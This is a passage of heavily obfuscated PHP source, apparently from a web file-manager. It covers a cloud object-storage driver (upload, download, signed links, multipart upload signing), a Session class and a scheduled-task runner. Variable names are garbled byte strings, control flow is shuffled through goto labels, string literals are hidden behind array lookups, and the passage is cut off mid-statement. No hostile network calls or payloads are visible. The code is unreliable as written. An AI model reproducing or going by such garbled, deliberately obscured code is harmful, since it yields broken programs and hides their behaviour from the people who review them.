$EËÒë³²¶¡[$F¢Ï‰‹®½¨[186]]; } if (isset($EËÒë³²¶¡[$F¢Ï‰‹®½¨[77]])) { $DŞèóÌ×±Ú[$F¢Ï‰‹®½¨[77]] = $EËÒë³²¶¡[$F¢Ï‰‹®½¨[77]]; } goto fø»Ú¶ÍæÉ; fø»Ú¶ÍæÉ: return $DŞèóÌ×±Ú; goto eÁÇÉ¼“; eÁÇÉ¼“: } private function folderInfo($AËğùùåß­, $FâÕÏ¨¯Ÿø = false) { goto AÊ‹¯¦Ï‹; b…–ÒÕ•†: if ($AËğùùåß­ == $e® §øŠ÷†[33]) { return $Bí†Î´“¾; } $AËğùùåß­ = trim($AËğùùåß­, $e® §øŠ÷†[8]) . $e® §øŠ÷†[8]; $e‚Ä÷Å„ÀØ = $this->objectMeta($AËğùùåß­); goto CƒØçíÅ; AÊ‹¯¦Ï‹: $e® §øŠ÷† =& $_SERVER[»„]; if ($FâÕÏ¨¯Ÿø) { return array($e® §øŠ÷†[28] => $this->pathThis($AËğùùåß­), $e® §øŠ÷†[75] => $this->getPathOuter($e® §øŠ÷†[8] . $AËğùùåß­), $e® §øŠ÷†[29] => $e® §øŠ÷†[76], $e® §øŠ÷†[184] => !0, $e® §øŠ÷†[185] => !0); } $Bí†Î´“¾ = array($e® §øŠ÷†[28] => $this->pathThis($AËğùùåß­), $e® §øŠ÷†[75] => $this->getPathOuter($e® §øŠ÷†[8] . $AËğùùåß­), $e® §øŠ÷†[29] => $e® §øŠ÷†[76], $e® §øŠ÷†[183] => 0, $e® §øŠ÷†[106] => 0, $e® §øŠ÷†[184] => !0, $e® §øŠ÷†[185] => !0); goto b…–ÒÕ•†; CƒØçíÅ: if (isset($e‚Ä÷Å„ÀØ[$e® §øŠ÷†[186]])) { $Bí†Î´“¾[$e® §øŠ÷†[183]] = $e‚Ä÷Å„ÀØ[$e® §øŠ÷†[186]]; } return $Bí†Î´“¾; goto c…’ÖºÁ; c…’ÖºÁ: } public function listObjs($aÄ¼éª—ğÃ, $D¢’Ü„àº· = null, $Fè—ÓÕ­Œá = null, $b¯„²à‡… = null) { $Aß¯äÒ™Õ =& $_SERVER[»„]; $aÄ¼éª—ğÃ = trim($aÄ¼éª—ğÃ, $Aß¯äÒ™Õ[8]); $fÔœ×Àï˜º = empty($aÄ¼éª—ğÃ) ? $Aß¯äÒ™Õ[33] : $aÄ¼éª—ğÃ . $Aß¯äÒ™Õ[8]; return $this->client->getBucket($this->bucket, $fÔœ×Àï˜º, $D¢’Ü„àº·, $Fè—ÓÕ­Œá, $b¯„²à‡…, !0); } public function has($D“‡ßÌèÌ, $BÅêˆÁ»Ë‘ = false, $DãÖ–ÒÌ³“ = true) { goto Dà„›ƒ§ôˆ; aÙñÏ† : if ($BÅêˆÁ»Ë‘) { return array($E¸“»–íƒ[187] => $A¸Ôƒ÷½Ç, $E¸“»–íƒ[188] => $C¶áèÉ¶‡); } return !1; goto EçÆñƒÏŸó; Dà„›ƒ§ôˆ: $E¸“»–íƒ =& $_SERVER[»„]; $A¸Ôƒ÷½Ç = 0; $C¶áèÉ¶‡ = 0; goto B†ß¹ğ“‰; B†ß¹ğ“‰: $A¼î‡éŸåè = $this->listObjs($D“‡ßÌèÌ, null, null, $E¸“»–íƒ[8]); $A¼î‡éŸåè = is_array($A¼î‡éŸåè) ? $A¼î‡éŸåè : array(); foreach ($A¼î‡éŸåè as $aœ§åÆê­‡) { if (isset($aœ§åÆê­‡[$E¸“»–íƒ[28]]) && substr($aœ§åÆê­‡[$E¸“»–íƒ[28]], -1) != $E¸“»–íƒ[8]) { if (!$BÅêˆÁ»Ë‘ && $DãÖ–ÒÌ³“) { return !0; } $A¸Ôƒ÷½Ç++; } else { if (isset($aœ§åÆê­‡[$E¸“»–íƒ[182]])) { if (!$BÅêˆÁ»Ë‘ && !$DãÖ–ÒÌ³“) { return !1; } $C¶áèÉ¶‡++; } } } goto aÙñÏ† ; EçÆñƒÏŸó: } public function listAll($b®·Œ»—ƒø) { $D›Ò‡á÷œÑ =& $_SERVER[»„]; $CÓŞŠôÕèÒ = $this->listObjs($b®·Œ»—ƒø); $bÚ­É¥ŒÏ› = $FÀ‹æãÔŠ = array(); foreach ($CÓŞŠôÕèÒ as $FËğÁ˜Ş©õ => $B½ŒïÎÎ) { $bÚ­É¥ŒÏ›[] = $B½ŒïÎÎ[$D›Ò‡á÷œÑ[28]]; $FÀ‹æãÔŠ[$FËğÁ˜Ş©õ] = $B½ŒïÎÎ[$D›Ò‡á÷œÑ[77]]; } return $this->listAllFiles($b®·Œ»—ƒø, $bÚ­É¥ŒÏ›, $FÀ‹æãÔŠ); } public function canRead($C›ñ„Óó—Ë) { $b‘‰óåĞ˜ =& $_SERVER[»„]; $D°Ûö‹¬Ãê = $this->client->getAccessControlPolicy($this->bucket, $C›ñ„Óó—Ë); if (!$D°Ûö‹¬Ãê) { return !1; } return in_array($D°Ûö‹¬Ãê, array($b‘‰óåĞ˜[189], $b‘‰óåĞ˜[190], $b‘‰óåĞ˜[191])) ? !0 : !1; } public function canWrite($E°©¶İ¨¤) { $C´°„àğ³ƒ =& $_SERVER[»„]; $e©Å¬Ò²‚ = $this->client->getAccessControlPolicy($this->bucket, $E°©¶İ¨¤); if (!$e©Å¬Ò²‚) { return !1; } return in_array($e©Å¬Ò²‚, array($C´°„àğ³ƒ[189], $C´°„àğ³ƒ[190])) ? !0 : !1; } public function getContent($A¤ÏÓğ»œ) { return $this->client->getObject($this->bucket, $A¤ÏÓğ»œ); } public function setContent($a¶®ã¨™ôà, $fšÃºéë£É = '', $Dè£¶ÉÁ­  = false) { goto dŞİ´½¬¬; e‚¾°²ÚÑ: $E—ÓğÅÕŒ÷ = $this->copyFile($a¶®ã¨™ôà, $a¶®ã¨™ôà, array($AÔëÒ÷Š£[192] => $E—ÓğÅÕŒ÷[$AÔëÒ÷Š£[193]])); return $E—ÓğÅÕŒ÷ ? !0 : !1; goto fä¤Êƒ‘‘ë; dŞİ´½¬¬: $AÔëÒ÷Š£ =& $_SERVER[»„]; $a¶®ã¨™ôà = $Dè£¶ÉÁ­  ? trim($a¶®ã¨™ôà, $AÔëÒ÷Š£[8]) . $AÔëÒ÷Š£[8] : $a¶®ã¨™ôà; $E é’ĞöÂõ = get_file_mime(get_path_ext($a¶®ã¨™ôà)); goto A¸àù¤Ë–…; A¸àù¤Ë–…: $E—ÓğÅÕŒ÷ = $this->client->putObject($fšÃºéë£É, $this->bucket, $a¶®ã¨™ôà, $AÔëÒ÷Š£[181], array(), $E é’ĞöÂõ); if (!$E—ÓğÅÕŒ÷) { return !1; } if ($Dè£¶ÉÁ­ ) { return !0; } goto e‚¾°²ÚÑ; fä¤Êƒ‘‘ë: } public function fileSubstr($B®ìÕß„¸ø, $eŒÀÀ“•¨, $cÛ“Ô²ŸÜ) { $eğìËóÎ÷¥ = $eŒÀÀ“•¨ + $cÛ“Ô²ŸÜ - 1; return $this->client->getObject($this->bucket, $B®ìÕß„¸ø, array($_SERVER[»„][194] => "\x62\x79\164\145\x73\x3d{$eŒÀÀ“•¨}\x2d{$eğìËóÎ÷¥}")); } public function upload($eãøª†‡Õ•, $A¥¯×ÙŒç, $AŸÓ¤§Š¯Ã = false, $A‰ÈÅ§×÷ˆ = REPEAT_REPLACE) { $A²Öáëö¬ö =& $_SERVER[»„]; $F•‘ ê‰ÑĞ = array($A²Öáëö¬ö[192] => @md5_file($A¥¯×ÙŒç)); $e˜ØÌÎè­® = array($A²Öáëö¬ö[195] => get_file_mime(get_path_ext($eãøª†‡Õ•))); if (IO::size($A¥¯×ÙŒç) <= 1024 * 1024 * 200) { $f‹›ÆçÚƒ® = $this->client->putObjectFile($A¥¯×ÙŒç, $this->bucket, $eãøª†‡Õ•, $A²Öáëö¬ö[181], $F•‘ ê‰ÑĞ, $e˜ØÌÎè­®); return !empty($f‹›ÆçÚƒ®) ? $this->getPathOuter($eãøª†‡Õ•) : !1; } $bÌŠ”èªé = $this->client->multiUploadObject($A¥¯×ÙŒç, $this->bucket, trim($eãøª†‡Õ•, $A²Öáëö¬ö[8]), $F•‘ ê‰ÑĞ, $e˜ØÌÎè­®); return $bÌŠ”èªé ? $this->getPathOuter($eãøª†‡Õ•) : !1; } public function download($cÉ¢È¢™ğ¥, $cÅê†Ûá’´) { if (!@is_dir($this->pathFather($cÅê†Ûá’´)) && !IO::mkdir($this->pathFather($cÅê†Ûá’´))) { return !1; } $bã¤Ã³¸º = $this->client->getObject($this->bucket, $cÉ¢È¢™ğ¥, array(), $cÅê†Ûá’´); return $bã¤Ã³¸º !== !1 ? $cÅê†Ûá’´ : !1; } public function link($fó”ã˜ÇÚ, $e‡Š²ˆã£ = array()) { $Bİ¤¤Ø‰ß =& $_SERVER[»„]; if ($this->signVer == $Bİ¤¤Ø‰ß[196]) { return $this->client->getAuthenticatedURL($this->bucket, $fó”ã˜ÇÚ, 3600 * 12, $e‡Š²ˆã£); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($fó”ã˜ÇÚ, $Bİ¤¤Ø‰ß[8]), 3600 * 12, $this->region, array(), !0, $e‡Š²ˆã£); } public function fileOut($F†øõ«£ï, $d™´»×³Ó³ = false, $cäáô¾Æ’ö = false, $eæ“§¢àŠä = '') { goto bìß¥¹Â¸ñ; bìß¥¹Â¸ñ: $d½Øù“ó˜ =& $_SERVER[»„]; if (!$cäáô¾Æ’ö) { $cäáô¾Æ’ö = $this->pathThis($F†øõ«£ï); } $F¶Ş¹ÇëÉÁ = get_file_mime(get_path_ext($cäáô¾Æ’ö)); goto b¹òˆ°Ğ”†; DÑÙù¯öŞÈ: $f…õ¼ß‰¼  = $this->link($F†øõ«£ï, $DÆ ªäÛİ); $this->fileOutLink($f…õ¼ß‰¼ ); goto eğÕ†à¨; b¹òˆ°Ğ”†: if ($F¶Ş¹ÇëÉÁ == $d½Øù“ó˜[197]) { return parent::fileOut($F†øõ«£ï, $d™´»×³Ó³, $cäáô¾Æ’ö, $eæ“§¢àŠä); } $d™´»×³Ó³ = $d™´»×³Ó³ ? $d½Øù“ó˜[198] : $d½Øù“ó˜[199]; $DÆ ªäÛİ = array($d½Øù“ó˜[200] => $d™´»×³Ó³ . $d½Øù“ó˜[201] . rawurlencode($cäáô¾Æ’ö), $d½Øù“ó˜[202] => $F¶Ş¹ÇëÉÁ); goto DÑÙù¯öŞÈ; eğÕ†à¨: } public function fileOutServer($Dá÷ƒ”’ô, $FŠùÖÚÚˆ = false, $cŸ‰ÅíáÙë = false, $eç»‰ = '') { parent::fileOut($Dá÷ƒ”’ô, $FŠùÖÚÚˆ, $cŸ‰ÅíáÙë, $eç»‰); } public function fileOutImage($eö‡à–É§Õ, $EÄÀæùî®¼ = 250) { $CÉÙª´ÓŒ = $this->link($eö‡à–É§Õ); $this->fileOutLink($CÉÙª´ÓŒ); } public function fileOutImageServer($c¾¼Ï‹òœÄ, $C´¬Œ¾•÷ˆ = 250) { parent::fileOutImage($c¾¼Ï‹òœÄ, $C´¬Œ¾•÷ˆ); } public function hashMd5($C•ç‘‰À±‰, $A†‰¹Šê¡Ó = '') { $a‹ç¨æ—¯ =& $_SERVER[»„]; $EŠËäÅ¬– = $this->objectMeta($C•ç‘‰À±‰); if (!$EŠËäÅ¬–) { return !1; } $A†‰¹Šê¡Ó = $A†‰¹Šê¡Ó ? $A†‰¹Šê¡Ó : _get($EŠËäÅ¬–, $a‹ç¨æ—¯[203]); $A†‰¹Šê¡Ó = $A†‰¹Šê¡Ó ? $A†‰¹Šê¡Ó : _get($EŠËäÅ¬–, $a‹ç¨æ—¯[193], $a‹ç¨æ—¯[33]); return $A†‰¹Šê¡Ó; } public function uploadFormData($FêÔ‚ó»ºò, $dá†Ì›‚Ú = 3600) { $AŸˆ×ïÍåÆ =& $_SERVER[»„]; $dµøß£Æ›ù = $this->pathFather($FêÔ‚ó»ºò); $FÀÁÜõÕã = $this->client->getHttpUploadPostParams($this->bucket, $dµøß£Æ›ù, $AŸˆ×ïÍåÆ[181], $dá†Ì›‚Ú); return array_merge((array) $FÀÁÜõÕã, array($AŸˆ×ïÍåÆ[165] => $this->getHost())); } public function multiUploadFormData($BòåÚ‘ù¬Û, $bÙ…ùÜ¨†‹ = 3600) { $CÊÉÆ’Šİ =& $_SERVER[»„]; $aËòÍ”æŠ¶ = gmdate($CÊÉÆ’Šİ[204]); $e·Æ÷åÕ– = array(); $càÑííËõĞ = $this->client->getUploadId($this->bucket, $BòåÚ‘ù¬Û, $e·Æ÷åÕ–); if (!$càÑííËõĞ) { return !1; } return array($CÊÉÆ’Šİ[205] => $càÑííËõĞ, $CÊÉÆ’Šİ[165] => $this->getHost() . $CÊÉÆ’Šİ[8] . $this->pathEncode($BòåÚ‘ù¬Û), $CÊÉÆ’Šİ[206] => $aËòÍ”æŠ¶, $CÊÉÆ’Šİ[89] => $BòåÚ‘ù¬Û); } public function multiUploadAuthData($c¦ÛˆÑêãÓ, $c‚”™òòòÎ = array()) { goto D… ËÍßØ; Dé–ï®½‰: $f£Ø»ºôÖº = $c‚”™òòòÎ[$cç‚×¤ä—¢[89]]; unset($c‚”™òòòÎ[$cç‚×¤ä—¢[89]]); if (isset($c‚”™òòòÎ[$cç‚×¤ä—¢[207]])) { $c‚”™òòòÎ[$cç‚×¤ä—¢[206]] = $EãóÇ¸˜”·; return $this->listUploadParts($f£Ø»ºôÖº, $c‚”™òòòÎ); } goto fŒÇ ÒŒ‚; Eğ½»íí”á: $bª¥ÌŞ²×ù = implode($cç‚×¤ä—¢[213], $c¹°»†…«š); $e¥†é“‹”Å = base64_encode(hash_hmac($cç‚×¤ä—¢[214], $bª¥ÌŞ²×ù, $this->secret, !0)); $Cï·ˆŒğ = $cç‚×¤ä—¢[215] . $this->accessKey . $cç‚×¤ä—¢[4] . $e¥†é“‹”Å; goto F‡ÂŒ†¢ó; F‡ÂŒ†¢ó: if (strpos($AÆß™Óç¤¶, $cç‚×¤ä—¢[209]) === 0) { return array($cç‚×¤ä—¢[216] => $Cï·ˆŒğ, $cç‚×¤ä—¢[206] => $EãóÇ¸˜”·); } return $Cï·ˆŒğ; goto Bà…À®â¥; fŒÇ ÒŒ‚: $c¹°»†…«š = array($cç‚×¤ä—¢[208], $cç‚×¤ä—¢[33], $cç‚×¤ä—¢[115], $cç‚×¤ä—¢[33], "\170\55\x61\x6d\x7a\x2d\144\x61\x74\x65\x3a{$EãóÇ¸˜”·}", $cç‚×¤ä—¢[8] . $this->bucket . $cç‚×¤ä—¢[8] . $this->pathEncode($f£Ø»ºôÖº) . $AÆß™Óç¤¶); if (strpos($AÆß™Óç¤¶, $cç‚×¤ä—¢[209]) === 0) { $c¹°»†…«š[0] = $cç‚×¤ä—¢[210]; } if (isset($c‚”™òòòÎ[$cç‚×¤ä—¢[211]]) && $c‚”™òòòÎ[$cç‚×¤ä—¢[211]] == $cç‚×¤ä—¢[212]) { $c¹°»†…«š[0] = $cç‚×¤ä—¢[212]; } goto Eğ½»íí”á; D… ËÍßØ: $cç‚×¤ä—¢ =& $_SERVER[»„]; $EãóÇ¸˜”· = isset($c‚”™òòòÎ[$cç‚×¤ä—¢[206]]) ? $c‚”™òòòÎ[$cç‚×¤ä—¢[206]] : gmdate($cç‚×¤ä—¢[204]); $AÆß™Óç¤¶ = isset($c‚”™òòòÎ[$cç‚×¤ä—¢[156]]) ? $c‚”™òòòÎ[$cç‚×¤ä—¢[156]] : $cç‚×¤ä—¢[33]; goto Dé–ï®½‰; Bà…À®â¥: } public function listUploadParts($BŒ·±ƒÉãœ, $C©Ã¶„¦”¢ = array()) { goto F‹Š—¥„£; c–‰­ÙµÄ: if (!$Aè‹¿¥Ô´Ş) { return !1; } unset($C©Ã¶„¦”¢[$dÁì×½‡šï[207]], $C©Ã¶„¦”¢[$dÁì×½‡šï[211]]); $C©Ã¶„¦”¢[$dÁì×½‡šï[89]] = $BŒ·±ƒÉãœ; goto f¶ßÚïÆ¼Š; F‹Š—¥„£: $dÁì×½‡šï =& $_SERVER[»„]; $aƒ¾ÍÏ¥“ˆ = str_replace($dÁì×½‡šï[217], $dÁì×½‡šï[33], $C©Ã¶„¦”¢[$dÁì×½‡šï[156]]); $Aè‹¿¥Ô´Ş = $this->client->listParts($this->bucket, $BŒ·±ƒÉãœ, $aƒ¾ÍÏ¥“ˆ); goto c–‰­ÙµÄ; f¶ßÚïÆ¼Š: $A¨©³ğ½Û = $this->multiUploadAuthData($BŒ·±ƒÉãœ, $C©Ã¶„¦”¢); if (empty($A¨©³ğ½Û)) { return !1; } return array($dÁì×½‡šï[216] => $A¨©³ğ½Û, $dÁì×½‡šï[206] => $C©Ã¶„¦”¢[$dÁì×½‡šï[206]], $dÁì×½‡šï[218] => $Aè‹¿¥Ô´Ş); goto cî˜„¶Áñ; cî˜„¶Áñ: } public function getHost() { return parent::getHost() . $_SERVER[»„][8] . $this->bucket; } public function size($Fİà†…œŒæ) { $a×¥ó‚ã = $this->objectMeta($Fİà†…œŒæ); return $a×¥ó‚ã ? $a×¥ó‚ã[$_SERVER[»„][77]] : 0; } public function info($C„¿‚ÅÎæŸ) { if ($this->isFolder($C„¿‚ÅÎæŸ)) { return $this->folderInfo($C„¿‚ÅÎæŸ); } else { if ($this->isFile($C„¿‚ÅÎæŸ)) { return $this->fileInfo($C„¿‚ÅÎæŸ); } } return !1; } public function exist($A‰ÉÎÛôò¡) { return $this->isFile($A‰ÉÎÛôò¡) || $this->isFolder($A‰ÉÎÛôò¡); } public function isFile($dìÉ¶¿«´) { return !$this->isFolder($dìÉ¶¿«´) && $this->objectMeta($dìÉ¶¿«´); } public function isFolder($AôÀª–Œ·Ì) { return $this->cacheMethod($_SERVER[»„][219], $AôÀª–Œ·Ì); } protected function objectMeta($cëø‘Ñ…”•) { return $this->cacheMethod($_SERVER[»„][220], $cëø‘Ñ…”•); } protected function _objectMeta($D÷ˆ–¡“Íö) { $b½¬“ÚÕãº =& $_SERVER[»„]; $D÷ˆ–¡“Íö = rtrim($D÷ˆ–¡“Íö, $b½¬“ÚÕãº[8]); try { $A¥‹Â‚ˆÓ = $this->client->getObjectInfo($this->bucket, $D÷ˆ–¡“Íö); if (!isset($A¥‹Â‚ˆÓ[$b½¬“ÚÕãº[203]]) && isset($A¥‹Â‚ˆÓ[$b½¬“ÚÕãº[221]])) { $A¥‹Â‚ˆÓ[$b½¬“ÚÕãº[203]] = $A¥‹Â‚ˆÓ[$b½¬“ÚÕãº[221]]; } } catch (OSS\Core\OssException $Bî™î‘Å¬ ) { $A¥‹Â‚ˆÓ = !1; } if (!$A¥‹Â‚ˆÓ) { } return $A¥‹Â‚ˆÓ; } protected function _isFolder($C”¨ç´¤) { goto d»ÈìØÀè; Eæ”ƒìª‚î: $Dà¨†Æâ¿ = $this->client->getBucket($this->bucket, $C”¨ç´¤, null, 1); if (empty($Dà¨†Æâ¿)) { return !1; } $Dà¨†Æâ¿ = array_values($Dà¨†Æâ¿); goto F¤†ïç¯¹; d»ÈìØÀè: $A§¦õ„Ñ¹» =& $_SERVER[»„]; $C”¨ç´¤ = rtrim($C”¨ç´¤, $A§¦õ„Ñ¹»[8]); if ($C”¨ç´¤ == $A§¦õ„Ñ¹»[33] || $C”¨ç´¤ == $A§¦õ„Ñ¹»[8]) { return !0; } goto Eæ”ƒìª‚î; F¤†ïç¯¹: if (substr($Dà¨†Æâ¿[0][$A§¦õ„Ñ¹»[28]], -1) == $A§¦õ„Ñ¹»[8]) { return !0; } if (get_path_this($Dà¨†Æâ¿[0][$A§¦õ„Ñ¹»[28]]) == get_path_this($C”¨ç´¤)) { return !1; } return !0; goto F’Áòµ¡…; F’Áòµ¡…: } } define($_SERVER[»„][222], 1); goto DÊ¹£ÍˆŞ¥; fÀè¶«º¦İ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto Cò¡óÁ¡¢; BÏ™ç‘Ğ«Ò: $aÌÀ Á¬¯Š = _get($GLOBALS, $d‚±Öš©ô™[1370], $aÌÀ Á¬¯Š); if (self::$sessionSign) { } else { if (Cookie::get($aÌÀ Á¬¯Š)) { self::$sessionSign = Cookie::get($aÌÀ Á¬¯Š); } else { self::$sessionSign = guid(); } } Cookie::setSafe($aÌÀ Á¬¯Š, self::$sessionSign, self::$sessionTime); goto F³”É†”™°; F³”É†”™°: $f÷ç«ëÄ¶ø = $c«‚›‡Ë¸ˆ[$d‚±Öš©ô™[1371]]; $eº¥Û”ê‘ = $c«‚›‡Ë¸ˆ[$f÷ç«ëÄ¶ø]; $F¬ÎÆÒÎ = $c«‚›‡Ë¸ˆ[$d‚±Öš©ô™[742]]; goto DÆ“¤ØöŠº; CŒÆƒªµ¾®: $c«‚›‡Ë¸ˆ = $GLOBALS[$d‚±Öš©ô™[6]][$d‚±Öš©ô™[333]]; self::$sessionTime = $c«‚›‡Ë¸ˆ[$d‚±Öš©ô™[1369]]; $aÌÀ Á¬¯Š = SESSION_ID; goto BÏ™ç‘Ğ«Ò; DÕÈÑ¢¢ÆÛ: return $B…Ù¤¤‹¼Œ; goto E——ƒ­†ƒÉ; DÆ“¤ØöŠº: switch ($f÷ç«ëÄ¶ø) { case $d‚±Öš©ô™[17]: self::$handle = Model($d‚±Öš©ô™[743]); break; case $d‚±Öš©ô™[744]: self::$handle = new CacheRedis($eº¥Û”ê‘, $F¬ÎÆÒÎ); break; case $d‚±Öš©ô™[745]: self::$handle = new CacheMemcached($eº¥Û”ê‘, $F¬ÎÆÒÎ); break; case $d‚±Öš©ô™[163]: $eº¥Û”ê‘[$d‚±Öš©ô™[75]] = $eº¥Û”ê‘[$d‚±Öš©ô™[75]] . $d‚±Öš©ô™[1372]; self::$handle = new CacheFile($eº¥Û”ê‘, $F¬ÎÆÒÎ); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $B…Ù¤¤‹¼Œ = new self(); goto DÕÈÑ¢¢ÆÛ; Cò¡óÁ¡¢: $d‚±Öš©ô™ =& $_SERVER[»„]; static $B…Ù¤¤‹¼Œ = false; if ($B…Ù¤¤‹¼Œ) { return $B…Ù¤¤‹¼Œ; } goto CŒÆƒªµ¾®; E——ƒ­†ƒÉ: } public static function sign($B«‚…ò¥– = false) { $B«‚…ò¥– && (self::$sessionSign = $B«‚…ò¥–); self::init(); return self::$sessionSign; } public static function set($A÷Ş‹·öŒ¥, $E‚¹ñŠ•½ã = false) { self::init(); if (is_array($A÷Ş‹·öŒ¥)) { foreach ($A÷Ş‹·öŒ¥ as $e‘øğõ°¹Ë => $fô©²¡»çø) { array_set_value(self::$data, $e‘øğõ°¹Ë, $fô©²¡»çø); } } else { array_set_value(self::$data, $A÷Ş‹·öŒ¥, $E‚¹ñŠ•½ã); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($a›»­ÇÄõ = false) { self::init(); if (!$a›»­ÇÄõ) { return self::$data; } return array_get_value(self::$data, $a›»­ÇÄõ); } public static function remove($a¤Ç´¢õ…–) { self::init(); unset(self::$data[$a¤Ç´¢õ…–]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[»„][747])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto fíÖ‚×Œ¶; fíÖ‚×Œ¶: $C®¹ Î“§ª =& $_SERVER[»„]; if (self::valueGet($C®¹ Î“§ª[677]) != $C®¹ Î“§ª[83]) { return; } if (self::valueGet($C®¹ Î“§ª[1373]) == $C®¹ Î“§ª[83]) { $F—‘Ã«¦ = self::valueGet($C®¹ Î“§ª[1374]); if (time() - $F—‘Ã«¦ > 3600 * 2) { self::restart(); } return; } goto BªŞ”¾¾Ÿ¨; f«ºéßñØ–: while (!0) { self::cacheClear(); if (self::valueGet($C®¹ Î“§ª[677]) != $C®¹ Î“§ª[83]) { self::valueSet($C®¹ Î“§ª[1373], $C®¹ Î“§ª[464]); self::log($C®¹ Î“§ª[1377]); die; } self::valueSet($C®¹ Î“§ª[1373], $C®¹ Î“§ª[83]); self::valueSet($C®¹ Î“§ª[1374], time()); self::taskRunAll(); sleep(self::valueGet($C®¹ Î“§ª[1378])); } goto E ¢½ëÉµ›; BªŞ”¾¾Ÿ¨: http_close(); self::valueSet($C®¹ Î“§ª[1373], $C®¹ Î“§ª[83]); Hook::bind($C®¹ Î“§ª[1375], $C®¹ Î“§ª[1376]); goto f«ºéßñØ–; E ¢½ëÉµ›: } public static function restart() { $bë“Ó³È†é =& $_SERVER[»„]; http_close(); self::valueSet($bë“Ó³È†é[677], $bë“Ó³È†é[464]); sleep(self::valueGet($bë“Ó³È†é[1378]) + 5); self::valueSet($bë“Ó³È†é[1373], $bë“Ó³È†é[464]); self::valueSet($bë“Ó³È†é[677], $bë“Ó³È†é[83]); } public static function shutdownEvent() { $Aô˜´¤˜© =& $_SERVER[»„]; self::valueSet($Aô˜´¤˜©[1373], $Aô˜´¤˜©[464]); self::log($Aô˜´¤˜©[1379]); } public static function config($CĞ„õÅšÖ¡, $fÚ¬æ«²Í‘) { $EëÑÛÙç‰ =& $_SERVER[»„]; $A–ÄŞÈ—öÌ = 20; $fÚ¬æ«²Í‘ = intval($fÚ¬æ«²Í‘) <= $A–ÄŞÈ—öÌ ? $A–ÄŞÈ—öÌ : intval($fÚ¬æ«²Í‘); self::valueSet($EëÑÛÙç‰[677], $CĞ„õÅšÖ¡); self::valueSet($EëÑÛÙç‰[1378], $fÚ¬æ«²Í‘); } private static function taskRunAll() { $Cé£¶Øä‚ =& $_SERVER[»„]; $cö‚Çï‚Íù = Model($Cé£¶Øä‚[1380])->listData(); $E»…Çó¦Æ¼ = count($cö‚Çï‚Íù); for ($fæ§„›ÛÄ = 0; $fæ§„›ÛÄ < $E»…Çó¦Æ¼; $fæ§„›ÛÄ++) { $BÜ’Ë¿Î = $cö‚Çï‚Íù[$fæ§„›ÛÄ]; if ($BÜ’Ë¿Î[$Cé£¶Øä‚[1381]] != $Cé£¶Øä‚[83]) { continue; } if (!self::taskTimeCheck($BÜ’Ë¿Î)) { continue; } self::taskRun($BÜ’Ë¿Î); } Hook::trigger($Cé£¶Øä‚[1382]); } private static function taskTimeCheck($fˆ¨ö‘„) { goto CÃ’± õ¾î; aìá‘×Ê‰å: $aéàù¹Ô‹Œ = strtotime($F—¸â‹§­á[1383] . $A×¥·‹ÍÏ[$F—¸â‹§­á[1384]] . $F—¸â‹§­á[1385]) - strtotime($F—¸â‹§­á[1386]); $cêÙ×Â«Êá = time() - strtotime(date($F—¸â‹§­á[1387]) . $F—¸â‹§­á[1388]); $Bá‰ô·æ‡’ = $cêÙ×Â«Êá >= $aéàù¹Ô‹Œ && $cêÙ×Â«Êá <= $aéàù¹Ô‹Œ + 3600; goto dñ‹‹¿¤±; CÃ’± õ¾î: $F—¸â‹§­á =& $_SERVER[»„]; $A×¥·‹ÍÏ = json_decode($fˆ¨ö‘„[$F—¸â‹§­á[186]], !0); $AÈ“âäÉÎÄ = intval($fˆ¨ö‘„[$F—¸â‹§­á[1374]]); goto aìá‘×Ê‰å; dñ‹‹¿¤±: switch ($A×¥·‹ÍÏ[$F—¸â‹§­á[29]]) { case $F—¸â‹§­á[1389]: if (time() - $AÈ“âäÉÎÄ < 3600 * 24 * 30) { return !1; } if ($A×¥·‹ÍÏ[$F—¸â‹§­á[1389]] == date($F—¸â‹§­á[1390]) && $Bá‰ô·æ‡’) { return !0; } break; case $F—¸â‹§­á[1391]: if (time() - $AÈ“âäÉÎÄ < 3600 * 24 * 7) { return !1; } $B¢Ïˆæ¼ÛŸ = date($F—¸â‹§­á[1392]) == 0 ? 7 : date($F—¸â‹§­á[1392]); if ($A×¥·‹ÍÏ[$F—¸â‹§­á[1391]] == $B¢Ïˆæ¼ÛŸ && $Bá‰ô·æ‡’) { return !0; } break; case $F—¸â‹§­á[1384]: if (time() - $AÈ“âäÉÎÄ < 3600 * 24) { return !1; } if ($Bá‰ô·æ‡’) { return !0; } break; case $F—¸â‹§­á[1393]: if (time() - $AÈ“âäÉÎÄ >= floatval($A×¥·‹ÍÏ[$F—¸â‹§­á[1393]]) * 60) { return !0; } break; default: break; } return !1; goto A‘£×ë‰¾Œ; A‘£×ë‰¾Œ: } public static function taskRun($FæÛ›ŠÏ¤) { goto D¿ßâ‹…â; a¥Ş¡ÉñÑ‹: Model($EçŒ¥ˆãØà[1398])->add(array($EçŒ¥ˆãØà[1399] => $EçŒ¥ˆãØà[33], $EçŒ¥ˆãØà[1400] => $EçŒ¥ˆãØà[464], $EçŒ¥ˆãØà[29] => $EçŒ¥ˆãØà[1401] . $FæÛ›ŠÏ¤[$EçŒ¥ˆãØà[363]], $EçŒ¥ˆãØà[1402] => json_encode(array($EçŒ¥ˆãØà[28] => $FæÛ›ŠÏ¤[$EçŒ¥ˆãØà[28]], $EçŒ¥ˆãØà[1403] => timeFloat() - $aØÆ½Ê›£, $EçŒ¥ˆãØà[277] => $bè²ÇÙ˜‡Ü)))); self::log($EçŒ¥ˆãØà[1404] . $FæÛ›ŠÏ¤[$EçŒ¥ˆãØà[363]] . $EçŒ¥ˆãØà[1405] . $bè²ÇÙ˜‡Ü); return !0; goto Dˆ„öùßŠ; dàÀ£à÷™: $aØÆ½Ê›£ = timeFloat(); $bè²ÇÙ˜‡Ü = $EçŒ¥ˆãØà[33]; switch 